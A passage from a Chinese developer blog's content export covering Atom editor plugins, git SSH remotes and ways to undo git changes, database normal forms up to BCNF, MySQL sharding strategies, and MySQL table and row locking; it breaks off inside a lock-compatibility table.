<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2xhbmd1YWdlLUphdmFTY3JpcHQtanN4">language-JavaScript-jsx<i class="fa fa-external-link-alt"></i></span> 支持JSX语法</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2F0b20taHRtbC1wcmV2aWV3">atom-html-preview<i class="fa fa-external-link-alt"></i></span> 实时预览HTML页面</p>
</li>
<li><p><span class="exturl" data-url="aHR0cDovL2xpYi5jc2RuLm5ldC9iYXNlL3JlYWN0">React<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3JlYWN0">react<i class="fa fa-external-link-alt"></i></span>—语法支持 <br><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2F0b20tcmVhY3QtbmF0aXZlLWF1dG9jb21wbGV0ZQ==">atom-react-native-autocomplete<i class="fa fa-external-link-alt"></i></span>—<span class="exturl" data-url="aHR0cDovL2xpYi5jc2RuLm5ldC9iYXNlL3JlYWN0bmF0aXZl">React Native<i class="fa fa-external-link-alt"></i></span>代码补全 <br><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL251Y2xpZGU=">nuclide<i class="fa fa-external-link-alt"></i></span>—facebook基于atom开发的进行react开发的IDE</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2xhbmd1YWdlLWJhYmVs">language-babel<i class="fa fa-external-link-alt"></i></span> 支持JSX语法</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2F0b20tbWluaWZ5">atom-minify<i class="fa fa-external-link-alt"></i></span> css、js代码压缩</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2F0b20tdGVybmpz">atom-ternjs<i class="fa fa-external-link-alt"></i></span> js,nodejs,es6补全，高度定制化</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2pzaGludA==">jshint<i class="fa fa-external-link-alt"></i></span> 验证js和jsx语法是否正确</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2Nzc2xpbnQ=">csslint<i class="fa fa-external-link-alt"></i></span> 验证css语法是否正确</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2F1dG9wcmVmaXhlcg==">autoprefixer<i class="fa fa-external-link-alt"></i></span> 自动为 CSS 属性添加特定的前缀</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2F1dG9jbG9zZS1odG1s">autoclose-html<i class="fa fa-external-link-alt"></i></span> 闭合html标签</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3BpZ21lbnRz">pigments<i class="fa fa-external-link-alt"></i></span> 颜色显示插件</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2xlc3MtYXV0b2NvbXBpbGU=">less-autocompile<i class="fa fa-external-link-alt"></i></span> less文件编译为css文件</p>
</li>
</ol>
<h2 id="php插件推荐"><a href="#php插件推荐" class="headerlink" title="php插件推荐"></a>php插件推荐</h2><ol>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3BocC1jcy1maXhlcg==">php-cs-fixer<i class="fa fa-external-link-alt"></i></span> php语法检查</p>
</li>
<li><p>php跳转插件(类似其他编辑器的ctrl+click) 需要同时安装以下两个插件：   </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2dvdG8=">goto<i class="fa fa-external-link-alt"></i></span> <br><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2dvdG8tZGVmaW5pdGlvbg==">goto-definition<i class="fa fa-external-link-alt"></i></span> 鼠标光标放置在要跳转的类下，按下快捷键 ctrl-alt-enter</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3BocC1kZWJ1Zw==">php-debug<i class="fa fa-external-link-alt"></i></span> php debug</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2F1dG9jb21wbGV0ZS1waHA=">autocomplete-php<i class="fa fa-external-link-alt"></i></span> php代码自动补全</p>
</li>
</ol>
<h2 id="python插件推荐"><a href="#python插件推荐" class="headerlink" title="python插件推荐"></a>python插件推荐</h2><ol>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3B5dGhvbi10b29scw==">python-tools<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL2xpYi5jc2RuLm5ldC9iYXNlL3B5dGhvbg==">Python<i class="fa fa-external-link-alt"></i></span> 跳转插件</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL3B5dGhvbi1kZWJ1Z2dlcg==">python-debugger<i class="fa fa-external-link-alt"></i></span> python debug</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2F1dG9jb21wbGV0ZS1weXRob24=">autocomplete-python<i class="fa fa-external-link-alt"></i></span> python代码自动补全</p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL2xpbnRlci1wZXA4">linter-pep8<i class="fa fa-external-link-alt"></i></span> python编码规范检查</p>
</li>
</ol>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>Atom</tag>
      </tags>
  </entry>
  <entry>
    <title>git push 不需要输入账号密码的解决方法</title>
    <url>/2018/03/git-github/</url>
    <content><![CDATA[<h2 id="Github-添加-ssh-key-之后-push-还要输入账号密码的解决方法"><a href="#Github-添加-ssh-key-之后-push-还要输入账号密码的解决方法" class="headerlink" title="Github 添加 ssh key 之后 push 还要输入账号密码的解决方法"></a>Github 添加 ssh key 之后 push 还要输入账号密码的解决方法</h2><p>加添 ssh keys 的方法网上一搜很多，但是 push 的时候还是要输入账号密码。</p>
<p>是因为 clone 的时候用的是 https 而没有用 ssh 的方法。</p>
<span id="more"></span>

<p>克隆仓库的时候，在 Github 上选择 SSH 即可，复制链接内容如下</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">git@github<span class="selector-class">.com</span>:gitslagga/gitslagga<span class="selector-class">.github</span><span class="selector-class">.io</span>.git`</span><br></pre></td></tr></table></figure>

<p>如果是已经克隆好的需要修改 config，配置 <code>remote url</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim .git/config</span></span><br></pre></td></tr></table></figure>

<p>配置成 Gihub 上选择的 SSH 的连接，在下面的 url 中</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[remote <span class="string">&quot;origin&quot;</span>]</span></span><br><span class="line">url = git@github<span class="selector-class">.com</span>:gitslagga/gitslagga<span class="selector-class">.github</span><span class="selector-class">.io</span>.git</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>Github</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Git 各种状态下撤销修改的方法</title>
    <url>/2018/03/git-revert/</url>
    <content><![CDATA[<h2 id="使用git时会出现各种各样的问题，下面是几种情况下怎么反悔的操作"><a href="#使用git时会出现各种各样的问题，下面是几种情况下怎么反悔的操作" class="headerlink" title="使用git时会出现各种各样的问题，下面是几种情况下怎么反悔的操作"></a>使用git时会出现各种各样的问题，下面是几种情况下怎么反悔的操作</h2><p>一，未加入缓存区，撤销文件修改</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$</span> git checkout -- <span class="keyword">file</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>二，已加入缓存区，撤销文件提交</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">git reset HEAD <span class="keyword">file</span></span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">git <span class="keyword">rm</span> --cached <span class="keyword">file</span></span><br></pre></td></tr></table></figure>

<p>三，已提交到本地，回滚提交</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">reset</span> <span class="comment">--HARD commit_id/HEAD^n</span></span><br></pre></td></tr></table></figure>

<p>四，已push到远程</p>
<p>1，git revert的方式</p>
<pre><code>1）git revert commit_id   //将要撤销的提交revert为一次新的提交，这样不仅提交被撤销了，而且本地分支也比远程分支多一次提交

2）git push origin master //推送到远程

这种方式是最方便的，但缺点是多了2次无用的commit，使整个分支的commit不再整洁。
</code></pre>
<p>2，如果远程仓库不是使用git init –bare建立的裸仓库（裸仓库无法回滚提交），而是一个普通仓库(通过git init建立)，那么你可以登录到远程服务器，然后回滚远程分支，然后再把本地分支回滚。</p>
<p>3，可删除远程分支，然后回滚本地分支，然后将本地分支push到origin</p>
<pre><code>1）git branch xxx_backup                    //创建备份分支

2）git push origin xxx_backup:xxx_backup    //将备份分支推送到origin

3）git checkout  xxx                        //切回要撤销修改的分支

4）git reset --hard commit_id               //撤销本地commit

5）git push origin :xxx                     //删除远程xxx分支

6）git push origin xxx:xxx                  //将本地撤销修改后的xxx分支推送到origin

7）git branch -d xxx_backup                 //删除本地备份分支

git push origin :xxx_backup                 //删除远程备份分支

上述步骤5执行时可能会出现错误，如下：
</code></pre>
<p>          <br>    尤其是远程仓库是在github或oschina上时，因为这些网站中将某分支设置成了当前分支，而删除当前分支是不允许的，所以要在这些网站的设置中切换当前分支为其它分支，然后再此执行步骤5.</p>
<p>4，方法3中，如果是自己建立的仓库，默认分支是master，我没找到修改默认分支的办法，master分支也就无法删除，方法4也就没用了。但有另一种方法可以解决问题</p>
<pre><code>1）登录服务器，备份中央仓库

    mv demo.git demo_backup.git

2）新建一个空的demo.git

    git init --bare demo.git

3）通过回滚，修复本地提交到正常状态

    git reset --hard 提交id

4）推送本地的master分支到服务器的demo.git

    git push remote master:master

这样的做法，可以保存之前的提交记录，是比较好的修复方式；这种方法比较适合修复出现代码覆盖的情况
</code></pre>
<p>如果中间出现问题，请通过demo_backup.git找回中央仓库</p>
<hr>
<p>错误的做法</p>
<p>1，直接reset本地提交，然后push到origin</p>
<pre><code>这种做法是错误的，git会报错，原因是远程仓库中该分支比本地分支多n次commit，只能先pull，再push。而如果先pull的话，那本地又变成和远程一样了，是解决不了问题的。
</code></pre>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库设计三大范式与 BCNF</title>
    <url>/2018/03/mysql-bcnf/</url>
    <content><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>范式间的区别</li>
</ol>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLmNvbS93aW5saW5nbGluL2FyY2hpdmUvMjAwOC8xMS8xOS8xMzM2MzM3Lmh0bWw=">http://www.cnblogs.com/winlinglin/archive/2008/11/19/1336337.html<i class="fa fa-external-link-alt"></i></span></p>
<ol start="2">
<li>数据库范式1NF 2NF 3NF BCNF</li>
</ol>
<p><span class="exturl" data-url="aHR0cDovL2Rldi5maXJub3cuY29tL2NvdXJzZS83X2RhdGFiYXNlcy9zcWwvc3FsU2VydmVyLzIwMDkwNTAyLzE2NjIzNC5odG1s">http://dev.firnow.com/course/7_databases&#x2F;sql&#x2F;sqlServer&#x2F;20090502&#x2F;166234.html<i class="fa fa-external-link-alt"></i></span></p>
<span id="more"></span>

<ol start="3">
<li>萨师煊&amp;王珊《数据库系统概论》(第三版)</li>
</ol>
<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>（1） 实体（entity）：就是实际应用中要用数据描述的事物，一般是名词。</p>
<p>（2） 字段（fields）：就是一项数据，也就是我们平常所说的“列”。</p>
<p>（3） 记录（record）：一个实体的一个实例所特有的相关数据项的集合，也就是我们平常所说的“行”。</p>
<p>（4） 键（key）：可唯一标识一条记录的一个字段或字段集，有时翻译为“码”。</p>
<p>（5） 主键（primary key）：用于唯一标识一个表中的一条记录的键。每个主键应该具有下列特征：</p>
<blockquote>
<p>1.  唯一的。</p>
<p>2.最小 的（尽量选择最少键的组合）。</p>
<p>3.非空。</p>
<p>4.不可更新的（不能随时更改）</p>
</blockquote>
<p>（6） 外键（foreign keys）：对连接父表和子表的相关记录的主键字段的复制。</p>
<p>（7） 依赖表（dependent table）：也称为弱实体（weak entity）是需要用父表标识的子表。</p>
<p>（8） 关联表（associative table）：是多对多关系中两个父表的子表。</p>
<p>（9） 实体完整性：每个表必须有一个有效的主 键。</p>
<p>（10） 参照完整性：没有不相匹配的外键值。</p>
<h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><h2 id="函数依赖"><a href="#函数依赖" class="headerlink" title="函数依赖"></a>函数依赖</h2><blockquote>
<p>通俗描述：</p>
<p>描述一个学生的关系，可以有学号(SNO),姓名(SNAME),系名(SDEPT)等几个属性。由于一个学号只对应一个学生，一个学生只在一个系学习。因此当学号确定之后，姓名和该学生所在系的值也就唯一被确定了，就像自变量x确定之后，相应的函数值f(x)也就唯一地被确定了一样，称SNO函数决定SNAME和SDEPT，或者说SNAME，SDEPT函数依赖于SNO，记为：SNO -&gt; SNAME， SNO -&gt; SDEPT.</p>
</blockquote>
<blockquote>
<p>严格定义：</p>
<p>设R(U)是属性集U上的关系模式。X，Y是U的子集。若对于R(U)的任意一个可能的关系r,r中不可能存在两个元组在X上的属性值相等，而在Y上的属性值不相等，则称X函数确定Y或者Y函数依赖于X。记为X-&gt;Y。</p>
</blockquote>
<blockquote>
<p>（如果不知道“关系”、“属性集”等定义，自己看大学教材去。这里的定义摘自萨师煊&amp;王珊《数据库系统概论》第三版）</p>
</blockquote>
<h2 id="完全函数依赖"><a href="#完全函数依赖" class="headerlink" title="完全函数依赖"></a>完全函数依赖</h2><blockquote>
<p>在R(U)中，如果Y函数依赖于X,并且对于X的任何一个真子集X’，都有Y不函数依赖于X’， 则称Y对X完全函数依赖。否则称Y对X部分函数依赖。</p>
</blockquote>
<blockquote>
<p>举个例子就明白了。假设一个学生有几个属性</p>
<p>SNO 学号</p>
<p>SNAME 姓名</p>
<p>SDEPT 系</p>
<p>SAGE 年龄</p>
<p>CNO 班级号</p>
<p>G 成绩</p>
<p>对于(SNO,SNAME,SDEPT,SAGE,CNO,G)来说，G完全依赖于(SNO, CNO), 因为(SNO,CNO)可以决定G，而SNO和CNO都不能单独决定G。</p>
<p>而SAGE部分函数依赖于(SNO,CNO),因为(SNO,CNO)可以决定SAGE，而单独的SNO也可以决定SAGE。</p>
</blockquote>
<h2 id="传递函数依赖"><a href="#传递函数依赖" class="headerlink" title="传递函数依赖"></a>传递函数依赖</h2><blockquote>
<p>在R(U)中，如果X-&gt;Y, Y-&gt;Z, 则称Z对X传递函数依赖。</p>
</blockquote>
<h2 id="候选键"><a href="#候选键" class="headerlink" title="候选键"></a>候选键</h2><blockquote>
<p>(又称候选码，候选关键字,码 ，candidate key)：</p>
<p>设K是一个R(U)中的属性或属性集合(注意可以是属性集合，也即多个属性的组合)，若K完全函数确定U，则K为R的候选键(Candidate key);</p>
<p>通俗地说就是，能够确定全部属性的某个属性或某组属性，称为候选键。若候选键多于一个，则选定其中一个作为主键。</p>
</blockquote>
<h2 id="主属性"><a href="#主属性" class="headerlink" title="主属性"></a>主属性</h2><blockquote>
<p>包含在任何一个候选键中的属性，叫做主属性(Prime attribute),不包含在任何候选键中的属性称为非主属性或非键属性或非关键字段。</p>
</blockquote>
<blockquote>
<p>例子：</p>
<p>在(SNO, CNO, G)中，SNO和CNO这俩合起来就是一个候选键，因为每个元组只要确定了SNO和CNO，则其它所有属性都可以根据SNO和CNO来确定。而SNO和CNO就都是“主属性”，G是“非主属性”。由于此例中只有一个候选键，于是只能选择(SNO, CNO)作为主键。</p>
<p>在(SNO,SDEPT, SNAME)中，SNO是一个候选键，因为只要SNO确定了，其它所有属性也都确定了，如果保证没有重名的话，则SNAME也是一个候选键，于是可以选SNO或者SNAME之一作为候选键。如果不能保证没有重名，就不能把SNAME当成候选键，于是就只有SNO能够做主键。</p>
</blockquote>
<h1 id="范式"><a href="#范式" class="headerlink" title="范式"></a>范式</h1><h2 id="第一范式不多说了"><a href="#第一范式不多说了" class="headerlink" title="第一范式不多说了"></a>第一范式不多说了</h2><blockquote>
<p>指数据库表的每一列都是不可分割的基本数据项<br>在任何一个关系数据库中，第一范式（1NF）是对关系模式的基本要求，不满足第一范式（1NF）的数据库就不是关系数据库。</p>
</blockquote>
<h2 id="第二范式"><a href="#第二范式" class="headerlink" title="第二范式"></a>第二范式</h2><blockquote>
<p>数据库表中不存在非关键字段对任一候选键的部分函数依赖，也即所有非关键字段都完全依赖于任意一组候选关键字。</p>
<p>2NF的违例只会出现在候选键由超过一个字段构成的表中，因为对单关键字字段不存在部分依赖问题。</p>
</blockquote>
<blockquote>
<p>例子：(学号, 姓名, 年龄, 课程名称, 成绩, 学分)</p>
<p>候选键只有一个，就是(姓名，课程名称)，则主键就是(姓名，课程名称)</p>
<p>存在如下决定关系：</p>
<p>1：(学号, 课程名称) → (姓名, 年龄, 成绩, 学分)</p>
<p>2：(课程名称) → (学分)</p>
<p>3：(学号) → (姓名, 年龄)</p>
<p>其中，姓名、年龄、学分是部分依赖于主键的，而成绩是完全依赖于主键的，存在部分依赖关系，所以不满足第二范式。</p>
</blockquote>
<blockquote>
<p>这会造成如下问题</p>
<p>(1) 数据冗余：</p>
<p>同一门课程由n个学生选修，”学分”就重复n-1次；同一个学生选修了m门课程，姓名和年龄就重复了m-1次。</p>
<p>(2) 更新异常：</p>
<p>若调整了某门课程的学分，数据表中所有行的”学分”值都要更新，否则会出现同一门课程学分不同的情况。</p>
<p>(3) 插入异常：</p>
<p>假设要开设一门新的课程，暂时还没有人选修。这样，由于还没有”学号”关键字，课程名称和学分也无法记录入数据 库。</p>
<p>(4) 删除异常：</p>
<p>假设一批学生已经完成课程的选修，这些选修记录就应该从数据库表中删除。但是，与此同 时，课程名称和学分信息也被删除了。很显然，这也会导致插入异常。</p>
<p>问题就在于存在非主属性对主键的部分依赖</p>
</blockquote>
<blockquote>
<p>解决办法：把原表(学号, 姓名, 年龄, 课程名称, 成绩, 学分)分成三个表：</p>
<p>学生：Student(学号, 姓名, 年龄)；</p>
<p>课程：Course(课程名称, 学分)；</p>
<p>选课关 系：SelectCourse(学号, 课程名称, 成绩)。</p>
</blockquote>
<h2 id="第三范式"><a href="#第三范式" class="headerlink" title="第三范式"></a>第三范式</h2><blockquote>
<p>在第二范式的基础上，数据表中如果不存在非关键字段对任一候选关键字段的传递函数依赖则符合第三范式</p>
<p>出现传递依赖A-&gt;B-&gt;C，即主键A可以确定出某一非关键字段B，而B又可以确定出C，这意味着C依赖于一个非关键字段B。因此第三范式又可描述为：表中不存在可以确定其他非关键字的非键字段</p>
</blockquote>
<blockquote>
<p>例子：表：(学号, 姓名, 年龄, 所在学院, 学院地点, 学院电话)</p>
<p>该表中候选字段只有“学号”，于是“学号”做主键。由于主键是单一属性，所以不存在非主属性对主键的部分函数依赖的问题，所以必然满足第二范式。但是存在如下传递依赖</p>
<p>(学号) → (所在学院) → (学院地点, 学院电话)</p>
<p>学院地点和学院电话传递依赖于学号，而学院地点和学院电话都是非关键字段，即表中出现了“某一非关键字段可以确定出其它非关键字段”的情况，于是违反了第三范式。</p>
</blockquote>
<blockquote>
<p>解决办法：</p>
<p>把原表分成两个表：</p>
<p>学生：(学号, 姓名, 年龄, 所在学院)；</p>
<p>学院：(学院, 地点, 电话)。</p>
</blockquote>
<h2 id="BCNF"><a href="#BCNF" class="headerlink" title="BCNF"></a>BCNF</h2><blockquote>
<p>BCNF意味着在关系模式中每一个决定因素都包含候选键，也就是说，只要属性或属性组A能够决定任何一个属性B，则A的子集中必须有候选键。BCNF范式排除了任何属性(不光是非主属性，2NF和3NF所限制的都是非主属性)对候选键的传递依赖与部分依赖。</p>
</blockquote>
<blockquote>
<p>例子：</p>
<p>假设仓库管理关系表为StorehouseManage(仓库ID, 存储物品ID, 管理员ID, 数量)，且有一个管理员只在一个仓库工作；一个仓库可以存储多种物品。这个数据库表中存在如下决定关系：</p>
<p>(仓库ID, 存储物品ID) →(管理员ID, 数量)</p>
<p>(管理员ID, 存储物品ID) → (仓库ID, 数量)</p>
<p>所以，(仓库ID, 存储物品ID)和(管理员ID, 存储物品ID)都是StorehouseManage的候选关键字，表中的唯一非关键字段为数量，它是符合第三范式的。但是，由于存在如下决定关系：</p>
<p>(仓库ID) → (管理员ID)</p>
<p>(管理员ID) → (仓库ID)</p>
<p>仓库I是决定因素，但仓库ID不包含候选键(candidate key,也就是候选码，简称码)。</p>
<p>同样的，管理员ID也是决定因素，但不包含候选键。</p>
<p>所以该表不满足BCNF。</p>
</blockquote>
<blockquote>
<p>3NF和BCNF是在函数依赖的条件下对模式分解所能达到的最大程度。一个模式中的关系模式如果都属于BCNF，那么在函数依赖范围内，它已经实现了彻底的分离，已消除了插入和删除的异常。3NF的“不彻底”性表现在可能存在主属性对键的部分依赖和传递依赖。</p>
</blockquote>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
  </entry>
  <entry>
    <title>MySQL 大表优化方案</title>
    <url>/2018/03/mysql-performance/</url>
    <content><![CDATA[<h2 id="垂直拆分"><a href="#垂直拆分" class="headerlink" title="垂直拆分"></a>垂直拆分</h2><p>垂直分库是根据数据库里面的数据表的相关性进行拆分，比如：一个数据库里面既存在用户数据，又存在订单数据，那么垂直拆分可以把用户数据放到用户库、把订单数据放到订单库。</p>
<p>垂直分表是对数据表进行垂直拆分的一种方式，常见的是把一个多字段的大表按常用字段和非常用字段进行拆分，每个表里面的数据记录数一般情况下是相同的，只是字段不一样，使用主键关联</p>
<span id="more"></span>

<p>垂直拆分的优点是：</p>
<pre><code>可以使得行数据变小，一个数据块 (Block) 就能存放更多的数据，在查询时就会减少 I/O 次数 (每次查询时读取的 Block 就少)

可以达到最大化利用 Cache 的目的，具体在垂直拆分的时候可以将不常变的字段放一起，将经常改变的放一起

数据维护简单
</code></pre>
<p>缺点是：</p>
<pre><code>主键出现冗余，需要管理冗余列

会引起表连接 JOIN 操作（增加 CPU 开销）可以通过在业务服务器上进行 join 来减少数据库压力

依然存在单表数据量过大的问题（需要水平拆分）

事务处理复杂
</code></pre>
<h2 id="水平拆分"><a href="#水平拆分" class="headerlink" title="水平拆分"></a>水平拆分</h2><p>水平拆分是通过某种策略将数据分片来存储，分库内分表和分库两部分，每片数据会分散到不同的 MySQL 表或库，达到分布式的效果，能够支持非常大的数据量。前面的表分区本质上也是一种特殊的库内分表</p>
<p>库内分表，仅仅是单纯的解决了单一表数据过大的问题，由于没有把表的数据分布到不同的机器上，因此对于减轻 MySQL 服务器的压力来说，并没有太大的作用，大家还是竞争同一个物理机上的 IO、CPU、网络，这个就要通过分库来解决</p>
<p>前面垂直拆分的用户表如果进行水平拆分，结果是：</p>
<p>实际情况中往往会是垂直拆分和水平拆分的结合，即将 Users_A_M 和 Users_N_Z 再拆成 Users 和 UserExtras，这样一共四张表</p>
<p>水平拆分的优点是:</p>
<pre><code>不存在单库大数据和高并发的性能瓶颈

应用端改造较少

提高了系统的稳定性和负载能力
</code></pre>
<p>缺点是：</p>
<pre><code>分片事务一致性难以解决

跨节点 Join 性能差，逻辑复杂

数据多次扩展难度跟维护量极大
</code></pre>
<h2 id="分片原则"><a href="#分片原则" class="headerlink" title="分片原则"></a>分片原则</h2><ul>
<li>能不分就不分，参考单表优化</li>
<li>分片数量尽量少，分片尽量均匀分布在多个数据结点上，因为一个查询 SQL 跨分片越多，则总体性能越差，虽然要好于所有数据在一个分片的结果，只在必要的时候进行扩容，增加分片数量</li>
<li>分片规则需要慎重选择做好提前规划，分片规则的选择，需要考虑数据的增长模式，数据的访问模式，分片关联性问题，以及分片扩容问题，最近的分片策略为范围分片，枚举分片，一致性 Hash 分片，这几种分片都有利于扩容</li>
<li>尽量不要在一个事务中的 SQL 跨越多个分片，分布式事务一直是个不好处理的问题</li>
<li>查询条件尽量优化，尽量避免 Select * 的方式，大量数据结果集下，会消耗大量带宽和 CPU 资源，查询尽量避免返回大量结果集，并且尽量为频繁使用的查询语句建立索引。</li>
<li>通过数据冗余和表分区赖降低跨库 Join 的可能</li>
</ul>
<p>这里特别强调一下分片规则的选择问题，如果某个表的数据有明显的时间特征，比如订单、交易记录等，则他们通常比较合适用时间范围分片，因为具有时效性的数据，我们往往关注其近期的数据，查询条件中往往带有时间字段进行过滤，比较好的方案是，当前活跃的数据，采用跨度比较短的时间段进行分片，而历史性的数据，则采用比较长的跨度存储。</p>
<p>总体上来说，分片的选择是取决于最频繁的查询 SQL 的条件，因为不带任何 Where 语句的查询 SQL，会遍历所有的分片，性能相对最差，因此这种 SQL 越多，对系统的影响越大，所以我们要尽量避免这种 SQL 的产生。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>由于水平拆分牵涉的逻辑比较复杂，当前也有了不少比较成熟的解决方案。这些方案分为两大类：客户端架构和代理架构。</p>
<ol>
<li>客户端架构</li>
</ol>
<p>通过修改数据访问层，如 JDBC、Data Source、MyBatis，通过配置来管理多个数据源，直连数据库，并在模块内完成数据的分片整合，一般以 Jar 包的方式呈现</p>
<p>可以看到分片的实现是和应用服务器在一起的，通过修改 Spring JDBC 层来实现</p>
<p>客户端架构的优点是：</p>
<pre><code>应用直连数据库，降低外围系统依赖所带来的宕机风险

集成成本低，无需额外运维的组件
</code></pre>
<p>缺点是：</p>
<pre><code>限于只能在数据库访问层上做文章，扩展性一般，对于比较复杂的系统可能会力不从心

将分片逻辑的压力放在应用服务器上，造成额外风险
</code></pre>
<ol start="2">
<li>代理架构</li>
</ol>
<p>通过独立的中间件来统一管理所有数据源和数据分片整合，后端数据库集群对前端应用程序透明，需要独立部署和运维代理组件</p>
<p>代理组件为了分流和防止单点，一般以集群形式存在，同时可能需要 Zookeeper 之类的服务组件来管理</p>
<p>代理架构的优点是：</p>
<pre><code>能够处理非常复杂的需求，不受数据库访问层原来实现的限制，扩展性强

对于应用服务器透明且没有增加任何额外负载
</code></pre>
<p>缺点是：</p>
<pre><code>需部署和运维独立的代理中间件，成本高

应用需经过代理来连接数据库，网络上多了一跳，性能有损失且有额外风险
</code></pre>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
  </entry>
  <entry>
    <title>MySQL 中的锁（表锁、行锁）</title>
    <url>/2018/03/mysql-transaction/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p><strong>锁是计算机协调多个进程或纯线程并发访问某一资源的机制。</strong>在数据库中，除传统的计算资源（CPU、RAM、I&#x2F;O）的争用以外，数据也是一种供许多用户共享的资源。</p>
<p>如何保证数据并发访问的一致性、有效性是所在有数据库必须解决的一个问题，锁冲突也是影响数据库并发访问性能的一个重要因素。</p>
<span id="more"></span>

<p>从这个角度来说，锁对数据库而言显得尤其重要，也更加复杂。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>相对其他数据库而言，MySQL的锁机制比较简单，其最显著的特点是不同的存储引擎支持不同的锁机制。</p>
<p>MySQL大致可归纳为以下3种锁：</p>
<ul>
<li>表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高，并发度最低。</li>
<li>行级锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低，并发度也最高。</li>
<li>页面锁：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般</li>
</ul>
<hr>
<h2 id="MySQL表级锁的锁模式（MyISAM"><a href="#MySQL表级锁的锁模式（MyISAM" class="headerlink" title="MySQL表级锁的锁模式（MyISAM)"></a>MySQL表级锁的锁模式（MyISAM)</h2><p>MySQL表级锁有两种模式：表共享锁（Table Read Lock）和表独占写锁（Table Write Lock）。</p>
<ul>
<li>对MyISAM的读操作，不会阻塞其他用户对同一表请求，但会阻塞对同一表的写请求；</li>
<li>对MyISAM的写操作，则会阻塞其他用户对同一表的读和写操作；</li>
<li>MyISAM表的读操作和写操作之间，以及写操作之间是串行的。</li>
</ul>
<p>当一个线程获得对一个表的写锁后，只有持有锁线程可以对表进行更新操作。其他线程的读、写操作都会等待，直到锁被释放为止。</p>
<h3 id="MySQL表级锁的锁模式"><a href="#MySQL表级锁的锁模式" class="headerlink" title="MySQL表级锁的锁模式"></a>MySQL表级锁的锁模式</h3><p>ＭySQL的表锁有两种模式：表共享读锁（Table Read Lock）和表独占写锁（Table Write Lock）。锁模式的兼容如下表</p>
<h4 id="MySQL中的表锁兼容性"><a href="#MySQL中的表锁兼容性" class="headerlink" title="ＭySQL中的表锁兼容性"></a>ＭySQL中的表锁兼容性</h4><table>
<thead>
<tr>
<th>当前锁模式&#x2F;是否兼容&#x2F;请求锁模式</th>
<th>None</th>
<th>读锁</th>
<th>写锁</th>
</tr>
</thead>
<tbody><tr>
<td>读锁</td>
<td>是</td>
<td>是</td>
<td>否</td>
</tr>
